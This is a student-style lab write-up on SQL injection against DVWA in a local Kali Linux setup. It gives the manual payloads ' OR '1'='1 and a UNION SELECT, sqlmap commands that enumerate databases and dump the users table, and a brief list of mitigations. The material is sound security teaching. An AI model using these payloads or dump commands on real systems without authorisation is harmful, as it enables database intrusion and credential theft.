# Project 7: Exploiting and Securing a Database using SQL Injection on DVWA

## Introduction

In this project, I exploited SQL Injection vulnerabilities using Damn Vulnerable Web Application (DVWA) on Kali Linux. The objective was to understand how attackers manipulate databases and extract sensitive information, and then learn how to properly secure applications against these attacks.

This project strengthened my understanding of web application security, database exploitation, and defensive coding practices.

---

## Lab Environment

### Setup Overview

Attacker Machine: Kali Linux  
Target Application: DVWA (Damn Vulnerable Web Application)  
Database: MySQL  

Kali Linux ↔ DVWA Web Application ↔ MySQL Database

---

## Tools Used

- Kali Linux  
- DVWA (Damn Vulnerable Web Application)  
- MySQL  
- Burp Suite  
- SQLMap  

---

## Environment Setup

### Installing DVWA

1. Clone the DVWA repository:

```bash
git clone https://github.com/digininja/DVWA
```

2. Navigate to the directory and configure:

```bash
cd DVWA
cp config/config.inc.php.dist config/config.inc.php
```

3. Start MySQL and create the database:

```bash
sudo service mysql start
sudo mysql -u root -p
CREATE DATABASE dvwa;
exit;
```

4. Start Apache:

```bash
sudo service apache2 start
```

5. Open the setup page in the browser:

```
http://localhost/DVWA/setup.php
```

Click **Create / Reset Database**.

---

## Activities Performed

### 1. Configuring DVWA Security Level

- Logged in at:
```
http://localhost/DVWA/login.php
```
- Default credentials: `admin / password`
- Set DVWA security level to **Low**

This intentionally exposed SQL Injection vulnerabilities for testing.

---

### 2. Identifying SQL Injection Vulnerability

I navigated to the SQL Injection module and tested the following payload:

```sql
' OR '1'='1
```

Result: The application returned all database records, confirming successful SQL Injection.

This demonstrated how improper input validation allows attackers to manipulate queries.

---

### 3. Extracting Database Information Manually

I used a UNION-based SQL injection payload:

```sql
' UNION SELECT user(), database(), version() --
```

Result: The database user, database name, and MySQL version were displayed.

This confirmed full query manipulation capability.

---

### 4. Automating SQL Injection using SQLMap

To automate exploitation, I used SQLMap:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<your-session-id>" --dbs
```

Result: SQLMap enumerated all available databases.

---

### 5. Extracting Tables and Data

List tables:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<your-session-id>" -D dvwa --tables
```

Dump table data:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<your-session-id>" -D dvwa -T users --dump
```

Result: Extracted user credentials from the database.

This demonstrated how automated tools can quickly escalate impact.

---

## Securing Against SQL Injection

After exploitation, I reviewed mitigation strategies:

- Use parameterized queries (Prepared Statements)
- Implement input validation and sanitization
- Apply least privilege principle to database accounts
- Use Web Application Firewalls (WAF)
- Disable detailed database error messages
- Regular security testing and code reviews

These controls prevent attackers from manipulating SQL queries.

---

## Key Skills Demonstrated

- Manual SQL Injection exploitation  
- UNION-based data extraction  
- Database enumeration  
- Automated exploitation using SQLMap  
- Understanding defensive coding practices  
- Identifying insecure database configurations  

---

## Conclusion

Through this project, I gained hands-on experience exploiting SQL Injection vulnerabilities in a controlled lab environment. More importantly, I learned how to secure applications against such attacks using proper input validation and secure database practices.

This project enhanced my web application security testing skills and reinforced the importance of secure coding standards.

---

## References

- DVWA Documentation  
- Kali Linux Documentation  
- OWASP SQL Injection Prevention Cheat Sheet  
- SQLMap Documentation  
